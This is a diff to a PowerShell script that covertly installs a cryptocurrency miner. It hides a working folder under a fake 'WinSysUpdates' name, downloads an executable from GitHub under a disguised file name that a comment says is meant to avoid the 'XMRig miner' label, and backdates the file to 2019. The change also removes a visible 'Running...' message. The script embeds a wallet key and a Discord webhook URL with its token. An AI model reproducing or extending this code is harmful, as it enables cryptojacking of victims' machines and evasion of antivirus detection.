@@ -6,8 +6,7 @@ $Wallet = "1871092382" # Mining Key
 $Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"
 
 # --- STEALTH SETUP ---
-Write-Host "Running..."
-$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
+$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
 if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 }
@@ -31,6 +30,7 @@ $wc = New-Object System.Net.WebClient
 if (-not (Test-Path $MaskedCpu)) {
     try {
         $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
+        # Download as the masked name to kill the 'XMRig miner' label
         $wc.DownloadFile($RawMinerUrl, $MaskedCpu)
         $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
         (Get-Item $MaskedCpu).CreationTime = $OldDate
